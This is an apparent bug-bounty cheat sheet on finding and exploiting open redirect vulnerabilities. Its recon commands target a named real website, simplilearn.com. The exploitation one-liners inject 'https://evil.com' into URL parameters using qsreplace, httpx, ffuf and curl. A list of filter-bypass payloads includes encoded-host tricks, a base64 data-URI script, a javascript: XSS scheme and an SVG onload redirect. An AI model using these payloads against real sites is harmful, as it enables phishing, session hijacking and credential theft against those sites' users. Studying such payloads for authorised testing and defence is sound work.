# Open Redirect

An **Open Redirect vulnerability** arises when a web application redirects users to external URLs without properly validating the input.

**Impact:** _Open redirects can aid phishing by making malicious links look legitimate, leading to credential theft, session hijacking, or bypassing security—resulting in account takeover and data exposure._

## Exploitation Using Nuclei

{% code overflow="wrap" %}
```bash
cat domains.txt | nuclei -t ~/.local/nuclei-templates/coffinxp_nuclei_templates/openRedirect.yaml -c 30
```
{% endcode %}

## Manual

### Obtain a list of URLs

{% hint style="info" %}
Fetch subdomain list from our subdomain enumeration automation.&#x20;
{% endhint %}

{% code overflow="wrap" %}
```bash
#Collecting URLs for Open Redirect
#Method 1
 echo 'simplilearn.com' | gau | grep '^https://[^/]*\.simplilearn\.com' > gau_urls.txt

#Method 2
echo 'https://www.simplilearn.com' | hakrawler -d 3 --subs -t 30 | grep '^https://[^/]*\.simplilearn\.com' > hakrawler_urls.txt

#Method 3
 katana -list simplilearn/recon/sub_enum/combined.txt -d 5 -jc -jsl -c 30 | grep '^https://[^/]*\.simplilearn\.com' > katana_urls.txt
 
 #Method 4
 waybackurls 'simplilearn.com' | grep '^https://[^/]*\.simplilearn\.com' > wayback_urls.txt
 
 #Method 5
 paramspider -d 'simplilearn.com' -p -s 
```
{% endcode %}

### Extracting Potential OpenRedirect URLs from a list of URLs

{% code overflow="wrap" %}
```bash
#gf tool did the similar task if we do `gf redirect` but it is less efficient
cat target_url_list.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redi=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee openredirect.txt
```
{% endcode %}

### Extracting Potential OpenRedirect URLs using google dorks

```bash
python3 dorking.py [coffinxp script]
```

**Google Dork**

{% code overflow="wrap" %}
```bash
site:target.com (inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= | inurl:dest= | inurl:target= | inurl:redirect_uri= | inurl:redirect_url= | inurl:checkout_url= | inurl:continue= | inurl:return_path= | inurl:returnTo= | inurl:out= | inurl:go= | inurl:.login?to= | inurl:origin= | inurl:callback_url= | inurl:jump= | inurl:action_url= | inurl:forward= | inurl:src= | inurl:http | inurl:&)
```
{% endcode %}

### Exploiting OpenRedirectURLs collected from above

{% code overflow="wrap" %}
```bash
#Method1
cat openredirect.txt | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"

#Method2
#Make URLs loxs tool suitable
cat openredirect.txt | uro | sed 's/=.*/=/' > loxs.txt
python3 loxs.py (fed it with URLs [loxs.txt])

#Method3
cat openredirect.txt | while read url; do cat /opt/loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"

#Method4 (Not so effective but we can use)
ffuf -w redirect_params.txt:PARAM -w loxs/payloads/or.txt:PAYLOAD -u "https://site.com/bitrix/redirect.php?PARAM=payload" -mc 301,302,303,307,308 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0" -x http://localip:8080 -t 10 -mr "Location: http://google.com"

#Method5 (Not so effective but we can use)
cat openredirect.txt | qsreplace "https://evil.com" | xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\n" {}
```
{% endcode %}

## Automation

* Python Tool by Faiyaz Ahmad: [https://github.com/faiyazahmad07/WEBSTER.git](https://github.com/faiyazahmad07/WEBSTER.git)&#x20;
* [https://github.com/devanshbatham/OpenRedireX](https://github.com/devanshbatham/OpenRedireX) (Tool by Devansh Bhatham)
* Nuclei Template: [https://github.com/coffinxp/nuclei-templates](https://github.com/coffinxp/nuclei-templates)
  * `cat domains.txt | nuclei -t ./openRedirect.yaml -c 30`
* [https://github.com/coffinxp/loxs](https://github.com/coffinxp/loxs)
  * Payloads available in `payloads/or.txt` in the same github repo.&#x20;

## High Level Manual Testing Techniques

**1. Simply Change the Domain**

```bash
?redirect=https://example.com → ?redirect=https://evil.com
```

**2. Bypass When Protocol is Blacklisted**

```bash
?redirect=https://example.com → ?redirect=//evil.com
```

**3. Bypass When Double Slash is Blacklisted**

```bash
?redirect=https://example.com → ?redirect=\\evil.com
```

**4. Bypass Using http: or https:**

```bash
?redirect=https://example.com → ?redirect=https:example.com
```

**5. Bypass Using %40 (At Symbol Encoding)**

```
?redirect=example.com → ?redirect=example.com%40evil.com
```

**6. Bypass if Only Checking for Domain Name**

```
?redirect=example.com → ?redirect=example.comevil.com
```

**7. Bypass Using Dot Encoding %2e**

```
?redirect=example.com → ?redirect=example.com%2eevil.com
```

**8. Bypass Using a Question Mark**

```
?redirect=example.com → ?redirect=evil.com?example.com
```

**9. Bypass Using Hash %23**

```
?redirect=example.com → ?redirect=evil.com%23example.com
```

**10. Bypass Using a Symbol**

```
?redirect=example.com → ?redirect=example.com/evil.com
```

**11. Bypass Using URL Encoded Chinese Dot %E3%80%82**

```
?redirect=example.com → ?redirect=evil.com%E3%80%82%23example.com
```

**12. Bypass Using a Null Byte %0d or %0a**

```
?redirect=/ → ?redirect=/%0d/evil.com
```

13\. Encoded URL Redirects

```
https://example.com/redirect?url=http%3A%2F%2Fmalicious.com
```

14\. Path-Based Redirects

```bash
https://example.com/redirect/http://malicious.com
```

15\. Data URI Redirects

```
https://example.com/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnVGhpcyBpcyBhbiBhdHRhY2snKTwvc2NyaXB0Pg==
```

16\. JavaScript Scheme Redirects

```
https://example.com/redirect?url=javascript:alert('XSS');//
```

17\. Open Redirect via HTTP Header

```makefile
Location: http://malicious.com
X-Forwarded-Host: evil.com
Refresh: 0; url=http://malicious.com
```

18\. **Path Traversal Hybrids**

```bash
/redirect?url=/../../https://evil.com
```

19\. **Using svg paylaod**

{% code overflow="wrap" %}
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='https://evil.com/'" xmlns="http://www.w3.org/2000/svg"></svg
```
{% endcode %}
